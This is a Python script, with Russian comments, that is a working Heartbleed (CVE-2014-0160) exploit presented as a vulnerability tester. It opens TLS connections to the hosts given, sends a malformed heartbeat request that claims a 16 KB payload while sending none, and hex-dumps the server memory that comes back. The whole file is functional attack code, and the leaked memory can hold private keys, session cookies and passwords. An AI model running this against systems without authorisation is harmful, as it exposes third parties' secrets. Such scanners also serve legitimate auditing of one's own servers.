import sys
import struct
import socket
import time
import select
from optparse import OptionParser
# Парсинг опций командной строки для указания сервера и порта
options = OptionParser(usage='%prog server [options]',
                       description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def h2bin(x):
    # Преобразует шестнадцатеричную строку в байты, удаляя пробелы и переносы строк
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))


# Список поддерживаемых версий SSL и TLS
version = []
version.append(['SSL 3.0', '03 00'])
version.append(['TLS 1.0', '03 01'])
version.append(['TLS 1.1', '03 02'])
version.append(['TLS 1.2', '03 03'])


def create_hello(version):
    # Создает пакет "Client Hello" для инициации SSL/TLS соединения
    hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01
    ''')
    return hello


def create_hb(version):
    # Создает Heartbeat-запрос
    hb = h2bin('18 ' + version + ' 00 03 01 40 00')
    return hb


def hexdump(s):
    # Выводит данные в шестнадцатеричном и символьном представлении
    for b in range(0, len(s), 16):
        lin = s[b: b + 16]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.') for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()


def recvall(s, length, timeout=5):
    # Читает все данные из сокета до достижения указанной длины или тайм-аута
    endtime = time.time() + timeout
    rdata = bytearray()
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    # Читает и обрабатывает сообщение из сокета
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay


def hit_hb(s, hb):
    # Отправляет Heartbeat-запрос и анализирует ответ
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False


def main():
    # Обработка аргументов командной строки и тестирование каждого хоста на уязвимость Heartbleed
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    for hostname in args:  # Проходим по всем введенным хостам
        print(f"Testing {hostname} for Heartbleed vulnerability...")
        for i in range(len(version)):
            print('Trying ' + version[i][0] + '...')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((hostname, opts.port))
                print('Sending Client Hello...')
                sys.stdout.flush()
                s.send(create_hello(version[i][1]))
                print('Waiting for Server Hello...')
                sys.stdout.flush()

                while True:
                    typ, ver, pay = recvmsg(s)
                    if typ is None:
                        print('Server closed connection without sending Server Hello.')
                        break
                    if typ == 22 and pay[0] == 0x0E:  # Server Hello Done
                        break

                print('Sending heartbeat request...')
                sys.stdout.flush()
                if hit_hb(s, create_hb(version[i][1])):
                    print(f"{hostname} is vulnerable with {version[i][0]}")
                    break
                s.close()
            except Exception as e:
                print(f"Error connecting to {hostname}: {e}")
                break
        print(f"Finished testing {hostname}")


if __name__ == '__main__':
    main()
